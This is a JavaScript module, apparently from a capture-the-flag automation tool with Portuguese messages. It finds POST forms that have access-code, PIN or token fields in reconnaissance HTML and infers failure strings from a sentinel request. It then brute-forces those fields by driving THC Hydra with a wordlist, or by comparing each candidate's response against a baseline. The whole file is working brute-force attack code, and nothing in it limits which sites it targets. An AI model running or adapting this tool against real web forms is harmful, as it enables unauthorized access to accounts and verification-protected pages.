import { readFile, writeFile, mkdtemp, rm } from 'fs/promises';
import { join } from 'path';
import { tmpdir } from 'os';
import { spawn } from 'node:child_process';

function whichCmd(cmd) {
  return new Promise((resolve) => {
    const finder = process.platform === 'win32' ? 'where' : 'which';
    const p = spawn(finder, [cmd], { stdio: ['ignore', 'pipe', 'pipe'] });
    p.on('error', () => resolve(false));
    p.on('close', (c) => resolve(c === 0));
  });
}

/**
 * @param {string} fullUrl
 * @returns {{ host: string; port: number; module: string; path: string; origin: string }}
 */
export function parsePostFormTargetUrl(fullUrl) {
  const u = new URL(String(fullUrl).split('#')[0]);
  const ssl = u.protocol === 'https:';
  const port = u.port ? Number(u.port) : ssl ? 443 : 80;
  const path = u.pathname || '/';
  const module = ssl ? 'https-post-form' : 'http-post-form';
  return { host: u.hostname, port, module, path, origin: u.origin };
}

function safeFieldName(name) {
  const n = String(name || 'code').trim();
  if (!/^[a-zA-Z_][a-zA-Z0-9_-]{0,31}$/.test(n)) throw new Error(`nome de campo inválido: ${n}`);
  return n;
}

function normalizeExtraPost(raw) {
  const s = String(raw ?? '').trim();
  if (!s) return '';
  const x = s.startsWith('&') ? s.slice(1) : s;
  if (!x) return '';
  const parts = x.split('&').filter(Boolean);
  for (const p of parts) {
    if (!/^[a-zA-Z0-9_.-]+=.+$/.test(p)) throw new Error('extra POST: cada par deve ser chave=valor (ASCII seguro)');
  }
  return x;
}

/** Lê atributo HTML em fragmento de tag (ex.: corpo de `<input …>`). */
export function htmlAttr(tag, name) {
  const t = String(tag || '');
  const low = t.toLowerCase();
  const key = `${String(name || '').toLowerCase()}=`;
  const idx = low.indexOf(key);
  if (idx < 0) return '';
  let i = idx + key.length;
  while (i < t.length && /\s/.test(t[i])) i += 1;
  const q = t[i];
  if (q === '"' || q === "'") {
    const end = t.indexOf(q, i + 1);
    return end < 0 ? '' : t.slice(i + 1, end).trim();
  }
  let j = i;
  while (j < t.length && !/\s/.test(t[j]) && t[j] !== '>') j += 1;
  return t.slice(i, j).trim();
}

function normAsciiLower(s) {
  return String(s)
    .normalize('NFD')
    .replace(/[\u0300-\u036f]/g, '')
    .toLowerCase();
}

function isCodeLikeFieldName(nm) {
  return /^(code|codigo|token|pin|access_code|accesscode|otp|chave)$/.test(normAsciiLower(nm));
}

function pickCodeLikeInputName(innerHtml) {
  const re = /<input\b([^>]*)>/gi;
  let m;
  let passwordFallback = '';
  while ((m = re.exec(innerHtml))) {
    const tag = m[1];
    const typ = (htmlAttr(tag, 'type') || 'text').toLowerCase();
    if (typ === 'submit' || typ === 'button' || typ === 'image' || typ === 'checkbox' || typ === 'radio') continue;
    const nm = htmlAttr(tag, 'name');
    if (!nm) continue;
    if (isCodeLikeFieldName(nm)) return nm;
    const ph = htmlAttr(tag, 'placeholder').toLowerCase();
    if (/c[oó]digo|code|token|pin|senha|chave|acesso/i.test(ph)) return nm;
    if (typ === 'password' && !passwordFallback) passwordFallback = nm;
  }
  return passwordFallback || '';
}

function collectFormExtrasAsPostString(innerHtml, primaryField) {
  const parts = [];
  const inp = /<input\b([^>]*)>/gi;
  let m;
  while ((m = inp.exec(innerHtml))) {
    const tag = m[1];
    const typ = (htmlAttr(tag, 'type') || 'text').toLowerCase();
    const nm = htmlAttr(tag, 'name');
    if (!nm || nm === primaryField) continue;
    if (typ === 'hidden') {
      const v = htmlAttr(tag, 'value');
      parts.push(`${nm}=${v}`);
    }
  }
  const btn = /<button\b([^>]*)>/gi;
  while ((m = btn.exec(innerHtml))) {
    const tag = m[1];
    const typ = (htmlAttr(tag, 'type') || 'submit').toLowerCase();
    if (typ !== 'submit' && typ !== 'button') continue;
    const nm = htmlAttr(tag, 'name');
    if (!nm) continue;
    const v = htmlAttr(tag, 'value');
    parts.push(`${nm}=${v || ''}`);
  }
  return parts.join('&');
}

/**
 * A partir do HTML já obtido no recon (curl), encontra `<form method="post">` com campo tipo “código”.
 * @returns {{ postUrl: string; fieldName: string; extraPost: string; pageUrl: string; pageHtml: string }[]}
 */
export function extractPostCodeFormsFromHtml(html, pageUrl) {
  const out = [];
  const page = String(pageUrl || '').split('#')[0];
  if (!page || !html) return out;
  const lower = html.toLowerCase();
  let from = 0;
  while (true) {
    const start = lower.indexOf('<form', from);
    if (start < 0) break;
    const gt = html.indexOf('>', start);
    if (gt < 0) break;
    const attrPart = html.slice(start + 5, gt);
    const end = lower.indexOf('</form>', gt);
    if (end < 0) break;
    const inner = html.slice(gt + 1, end);
    from = end + 7;

    if (!/\bmethod\s*=\s*["']?\s*post\b/i.test(attrPart)) continue;

    const fieldName = pickCodeLikeInputName(inner);
    if (!fieldName) continue;

    let postUrl;
    try {
      const action = htmlAttr(attrPart, 'action');
      postUrl = new URL(action || '', page).href;
    } catch {
      continue;
    }

    const extraPost = collectFormExtrasAsPostString(inner, fieldName);
    out.push({ postUrl, fieldName, extraPost, pageUrl: page, pageHtml: html });
  }
  return out;
}

export function discoverFormCodeTargetsFromWebResponses(webResponses = []) {
  const seen = new Set();
  const list = [];
  for (const r of webResponses || []) {
    const pageUrl = String(r?.finalUrl || r?.url || '').split('#')[0];
    const html = r?.bodyText;
    if (!pageUrl || typeof html !== 'string' || html.length < 20) continue;
    for (const row of extractPostCodeFormsFromHtml(html, pageUrl)) {
      const k = `${row.postUrl}|${row.fieldName}|${row.extraPost}`;
      if (seen.has(k)) continue;
      seen.add(k);
      list.push(row);
    }
  }
  return list.slice(0, 8);
}

function stripScripts(html) {
  return String(html || '').replace(/<script[\s\S]*?<\/script>/gi, '');
}

export function inferHydraFailFromBodies(getHtml, postHtml) {
  const a = stripScripts(getHtml).replace(/\s+/g, ' ').trim().toLowerCase();
  const b = stripScripts(postHtml).replace(/\s+/g, ' ').trim().toLowerCase();
  if (a === b) return '';
  const tokens = [
    'inválido',
    'invalido',
    'invalid',
    'incorrect',
    'incorrecta',
    'erro',
    'wrong',
    'negado',
    'failed',
    'failure',
    'denied',
    'não encontrado',
    'nao encontrado',
  ];
  for (const t of tokens) {
    if (b.includes(t) && !a.includes(t)) return t;
  }
  return '';
}

async function fetchPostApplicationForm(postUrl, fieldName, extraPost, value, requestTimeoutMs) {
  const body = { [fieldName]: value };
  if (extraPost) {
    for (const part of extraPost.split('&')) {
      const eq = part.indexOf('=');
      if (eq === -1) continue;
      body[part.slice(0, eq)] = part.slice(eq + 1);
    }
  }
  const enc = new URLSearchParams(body).toString();
  const u = new URL(String(postUrl).split('#')[0]);
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), requestTimeoutMs);
  try {
    const r = await fetch(u.href, {
      method: 'POST',
      redirect: 'manual',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        Accept: 'text/html,*/*;q=0.8',
      },
      body: enc,
      signal: ctrl.signal,
    });
    return await r.text();
  } finally {
    clearTimeout(t);
  }
}

/**
 * Lê HTML do recon + um POST sentinela; devolve substring candidata a :F= (se houver).
 */
export async function autoInferFailSubstring({
  postUrl,
  fieldName,
  extraPost = '',
  pageHtml = '',
  requestTimeoutMs = 12000,
} = {}) {
  const sentinel = `__GHOSTCTF_SENT__${Date.now().toString(36)}__`;
  let postText = '';
  try {
    postText = await fetchPostApplicationForm(postUrl, fieldName, extraPost, sentinel, requestTimeoutMs);
  } catch {
    return '';
  }
  return inferHydraFailFromBodies(pageHtml, postText);
}

/**
 * Junta auto-detect (HTML das respostas curl), URLs da UI, paths heurísticos; opcional F= inferido.
 */
export async function prepareFormCodeBruteFromRecon({
  webResponses = [],
  userUrlsRaw = '',
  userField = 'code',
  userExtra = 'validar=validar',
  userFail = '',
  userSuccess = '',
  skipAutoDetect = false,
  diffOnly = false,
  log,
} = {}) {
  const logger = typeof log === 'function' ? log : () => {};
  const urlSet = new Set();
  let fieldName = String(userField || 'code').trim() || 'code';
  let extraPost = String(userExtra ?? 'validar=validar').trim();

  const discovered = skipAutoDetect ? [] : discoverFormCodeTargetsFromWebResponses(webResponses);
  if (discovered.length) {
    logger(
      `Form code: recon — ${discovered.length} formulário(s) POST+campo código (${discovered
        .map((d) => d.postUrl)
        .slice(0, 4)
        .join(' · ')})`,
      'info',
    );
    for (const d of discovered.slice(0, 6)) urlSet.add(d.postUrl);
    fieldName = discovered[0].fieldName;
    if (discovered[0].extraPost) extraPost = discovered[0].extraPost;
  }

  for (const line of String(userUrlsRaw || '')
    .split(/[\n,]+/)
    .map((s) => s.trim())
    .filter(Boolean)) {
    try {
      urlSet.add(new URL(line).href);
    } catch {
      urlSet.add(line);
    }
  }
  if (!skipAutoDetect) {
    for (const u of collectFormCodeCandidateUrls(webResponses)) urlSet.add(u);
  }

  const targetUrls = [...urlSet].slice(0, 6);
  let failSubstring = String(userFail || '').trim();
  let successSubstring = String(userSuccess || '').trim();

  if (!diffOnly && !failSubstring && !successSubstring && discovered[0]) {
    const d0 = discovered[0];
    const inferred = await autoInferFailSubstring({
      postUrl: d0.postUrl,
      fieldName: d0.fieldName,
      extraPost: d0.extraPost,
      pageHtml: d0.pageHtml,
    });
    if (inferred) {
      failSubstring = inferred;
      logger(`Form code: recon — substring de falha inferida para hydra (F=${inferred})`, 'success');
    } else {
      logger(
        'Form code: recon — GET e POST(sentinel) sem token de erro novo; hydra precisaria de F/S manual ou usa-se modo diff.',
        'info',
      );
    }
  }

  return {
    targetUrls,
    fieldName,
    extraPost,
    failSubstring,
    successSubstring,
    discoveredCount: discovered.length,
  };
}

/**
 * THC Hydra http(s)-post-form: um único campo (ex. code=^PASS^) + pares extra.
 * Requer failSubstring OU successSubstring (hydra :F= ou :S=).
 */
export async function runFormCodeHydraBrute({
  targetUrls = [],
  fieldName = 'code',
  extraPost = 'validar=validar',
  wordlistPath = '',
  maxPasswords = 200,
  failSubstring = '',
  successSubstring = '',
  log,
  timeoutMs = 300000,
} = {}) {
  const logger = typeof log === 'function' ? log : () => {};
  const targets = [...new Set((targetUrls || []).map((x) => String(x || '').trim()).filter(Boolean))].slice(0, 4);
  if (!targets.length) {
    logger('Form code (hydra): sem URLs — cola URLs na UI ou garante cadastro.php no recon.', 'warn');
    return { ok: false, error: 'no-targets', hydra: false };
  }

  const failPat = String(failSubstring || '').trim();
  const succPat = String(successSubstring || '').trim();
  if (!failPat && !succPat) {
    logger('Form code (hydra): indica substring de falha (F=) ou sucesso (S=) para o hydra.', 'warn');
    return { ok: false, error: 'no-condition', hydra: false };
  }

  const wl = String(wordlistPath || '').trim();
  if (!wl) {
    logger('Form code (hydra): indica caminho absoluto da wordlist.', 'warn');
    return { ok: false, error: 'no-wordlist', hydra: false };
  }

  const hydraOk = await whichCmd('hydra');
  if (!hydraOk) {
    logger('Form code (hydra): hydra não está no PATH.', 'warn');
    return { ok: false, error: 'no-hydra', hydra: false };
  }

  let field;
  try {
    field = safeFieldName(fieldName);
  } catch (e) {
    logger(`Form code (hydra): ${e?.message || String(e)}`, 'warn');
    return { ok: false, error: 'bad-field', hydra: false };
  }

  let extra;
  try {
    extra = normalizeExtraPost(extraPost);
  } catch (e) {
    logger(`Form code (hydra): ${e?.message || String(e)}`, 'warn');
    return { ok: false, error: 'bad-extra', hydra: false };
  }

  let content;
  try {
    content = await readFile(wl, 'utf8');
  } catch (e) {
    logger(`Form code (hydra): não consegui ler wordlist — ${e?.message || String(e)}`, 'warn');
    return { ok: false, error: 'read-wordlist', hydra: true };
  }

  const lines = content
    .split(/\r?\n/)
    .map((l) => l.trim())
    .filter((l) => l.length > 0 && l.length <= 256);
  const slice = lines.slice(0, Math.min(maxPasswords, 500));
  if (!slice.length) {
    logger('Form code (hydra): wordlist vazia após filtro.', 'warn');
    return { ok: false, error: 'empty-wordlist', hydra: true };
  }

  const dir = await mkdtemp(join(tmpdir(), 'ghhydcode-'));
  const passFile = join(dir, 'pass.txt');
  await writeFile(passFile, `${slice.join('\n')}\n`, 'utf8');

  const tail = succPat ? `S=${succPat}` : `F=${failPat}`;
  const bodyCore = extra ? `${field}=^PASS^&${extra}` : `${field}=^PASS^`;

  const results = [];
  for (const pageUrl of targets) {
    let meta;
    try {
      meta = parsePostFormTargetUrl(pageUrl);
    } catch (e) {
      logger(`Form code (hydra): URL inválida ${pageUrl} — ${e?.message || String(e)}`, 'warn');
      continue;
    }

    const formSpec = `${meta.path}:${bodyCore}:${tail}`;
    const outFile = join(dir, `hydra-${meta.host}-${meta.port}.out`);
    const args = [
      '-l',
      'x',
      '-P',
      passFile,
      '-s',
      String(meta.port),
      '-t',
      '3',
      '-f',
      '-W',
      '3',
      '-o',
      outFile,
      meta.host,
      meta.module,
      formSpec,
    ];

    logger(
      `Form code (hydra): até ${slice.length} tentativas · ${meta.module} ${meta.host}:${meta.port} · ${tail.slice(0, 80)}`,
      'warn',
    );

    const one = await new Promise((resolve) => {
      const child = spawn('hydra', args, { stdio: ['ignore', 'pipe', 'pipe'] });
      const errBuf = [];
      child.stderr.on('data', (d) => errBuf.push(d));
      const wall = setTimeout(() => {
        try {
          child.kill('SIGTERM');
        } catch {
          /* */
        }
      }, timeoutMs + 5000);
      child.on('error', async (e) => {
        clearTimeout(wall);
        resolve({ error: e.message, outFile });
      });
      child.on('close', async () => {
        clearTimeout(wall);
        let outText = '';
        try {
          outText = await readFile(outFile, 'utf8');
        } catch {
          /* */
        }
        const stderr = Buffer.concat(errBuf).toString('utf8').slice(0, 4000);
        resolve({ outText, stderr, outFile });
      });
    });

    if (one.error) {
      results.push({ pageUrl, error: one.error });
      continue;
    }

    const outText = one.outText || '';
    let m = outText.match(/login:\s*(\S+)\s+password:\s*(\S+)/i);
    if (!m) m = outText.match(/host:\s*\S+\s+login:\s*(\S+)\s+password:\s*(\S+)/i);
    if (m) {
      const password = m[2];
      logger(`Form code (hydra): possível código — "${password}" @ ${pageUrl}`, 'success');
      results.push({ pageUrl, cracked: true, password, snippet: outText.slice(0, 2000) });
      await rm(dir, { recursive: true, force: true }).catch(() => {});
      return {
        ok: true,
        hydra: true,
        cracked: true,
        password,
        pageUrl,
        results,
      };
    }

    results.push({
      pageUrl,
      cracked: false,
      snippet: (outText + '\n' + (one.stderr || '')).slice(0, 2500),
    });
  }

  await rm(dir, { recursive: true, force: true }).catch(() => {});
  return { ok: true, hydra: true, cracked: false, results };
}

/**
 * Brute por comparação de corpo: baseline = POST com código sentinela inválido;
 * candidatos cuja resposta difere do baseline são reportados (útil quando não há F=/S= estável).
 */
export async function runFormCodeDiffBrute({
  targetUrls = [],
  fieldName = 'code',
  extraPost = 'validar=validar',
  wordlistPath = '',
  maxPasswords = 200,
  log,
  requestTimeoutMs = 12000,
  delayMs = 0,
} = {}) {
  const logger = typeof log === 'function' ? log : () => {};
  const targets = [...new Set((targetUrls || []).map((x) => String(x || '').trim()).filter(Boolean))].slice(0, 4);
  if (!targets.length) {
    logger('Form code (diff): sem URLs.', 'warn');
    return { ok: false, error: 'no-targets', mode: 'diff' };
  }

  const wl = String(wordlistPath || '').trim();
  if (!wl) {
    logger('Form code (diff): indica caminho absoluto da wordlist.', 'warn');
    return { ok: false, error: 'no-wordlist', mode: 'diff' };
  }

  let field;
  try {
    field = safeFieldName(fieldName);
  } catch (e) {
    logger(`Form code (diff): ${e?.message || String(e)}`, 'warn');
    return { ok: false, error: 'bad-field', mode: 'diff' };
  }

  let extra;
  try {
    extra = normalizeExtraPost(extraPost);
  } catch (e) {
    logger(`Form code (diff): ${e?.message || String(e)}`, 'warn');
    return { ok: false, error: 'bad-extra', mode: 'diff' };
  }

  let content;
  try {
    content = await readFile(wl, 'utf8');
  } catch (e) {
    logger(`Form code (diff): não consegui ler wordlist — ${e?.message || String(e)}`, 'warn');
    return { ok: false, error: 'read-wordlist', mode: 'diff' };
  }

  const lines = content
    .split(/\r?\n/)
    .map((l) => l.trim())
    .filter((l) => l.length > 0 && l.length <= 256);
  const slice = lines.slice(0, Math.min(maxPasswords, 500));
  if (!slice.length) {
    logger('Form code (diff): wordlist vazia após filtro.', 'warn');
    return { ok: false, error: 'empty-wordlist', mode: 'diff' };
  }

  const sentinel = `__GHOSTCTF_INVALID__${Date.now().toString(36)}__`;
  const enc = (o) => new URLSearchParams(o).toString();

  for (const pageUrl of targets) {
    let u;
    try {
      u = new URL(String(pageUrl).split('#')[0]);
    } catch (e) {
      logger(`Form code (diff): URL inválida ${pageUrl}`, 'warn');
      continue;
    }

    const baseBody = { [field]: sentinel };
    if (extra) {
      for (const part of extra.split('&')) {
        const eq = part.indexOf('=');
        if (eq === -1) continue;
        baseBody[part.slice(0, eq)] = part.slice(eq + 1);
      }
    }

    const postOnce = async (value) => {
      const body = { ...baseBody, [field]: value };
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), requestTimeoutMs);
      try {
        const r = await fetch(u.href, {
          method: 'POST',
          redirect: 'manual',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            Accept: 'text/html,*/*;q=0.8',
          },
          body: enc(body),
          signal: ctrl.signal,
        });
        const text = await r.text();
        return { status: r.status, text };
      } finally {
        clearTimeout(t);
      }
    };

    let baseline;
    try {
      baseline = await postOnce(sentinel);
    } catch (e) {
      logger(`Form code (diff): baseline falhou ${u.href} — ${e?.message || String(e)}`, 'warn');
      continue;
    }

    logger(
      `Form code (diff): baseline POST ${baseline.status} · ${baseline.text.length} bytes · ${slice.length} candidatos @ ${u.href}`,
      'info',
    );

    for (let i = 0; i < slice.length; i += 1) {
      const cand = slice[i];
      if (delayMs > 0 && i > 0) await new Promise((r) => setTimeout(r, delayMs));
      let res;
      try {
        res = await postOnce(cand);
      } catch {
        continue;
      }
      if (res.status !== baseline.status || res.text !== baseline.text) {
        logger(`Form code (diff): resposta diferente do baseline — tentativa "${cand}" (confirma manualmente)`, 'success');
        return {
          ok: true,
          mode: 'diff',
          cracked: true,
          password: cand,
          pageUrl: u.href,
          baselineStatus: baseline.status,
          candidateStatus: res.status,
          baselineLen: baseline.text.length,
          candidateLen: res.text.length,
        };
      }
    }
  }

  return { ok: true, mode: 'diff', cracked: false };
}

/**
 * Com substring F= ou S=: usa THC Hydra se estiver no PATH; senão diff.
 * Sem F/S: diff (corpo diferente do baseline com código sentinela).
 */
export async function runFormCodeAccessBrute(opts = {}) {
  const failPat = String(opts.failSubstring || '').trim();
  const succPat = String(opts.successSubstring || '').trim();
  const log = typeof opts.log === 'function' ? opts.log : () => {};

  if (failPat || succPat) {
    const hydraOk = await whichCmd('hydra');
    if (hydraOk) return runFormCodeHydraBrute(opts);
    log('Form code: hydra não no PATH — modo diff (corpo ≠ baseline).', 'info');
  } else {
    log('Form code: sem substring F/S — modo diff (corpo ≠ baseline).', 'info');
  }
  return runFormCodeDiffBrute(opts);
}

export function collectFormCodeCandidateUrls(webResponses = []) {
  const out = new Set();
  const pathHint =
    /cadastro\.php|registro\.php|verificacao|verifica\u00e7ao|codigo|c\u00f3digo|code\.php|access.?code|signup|register.*code/i;
  for (const r of webResponses || []) {
    const raw = String(r?.finalUrl || r?.url || '').split('#')[0];
    if (!raw) continue;
    if (pathHint.test(raw)) {
      try {
        const x = new URL(raw);
        out.add(x.href);
      } catch {
        out.add(raw);
      }
    }
  }
  return [...out].slice(0, 8);
}
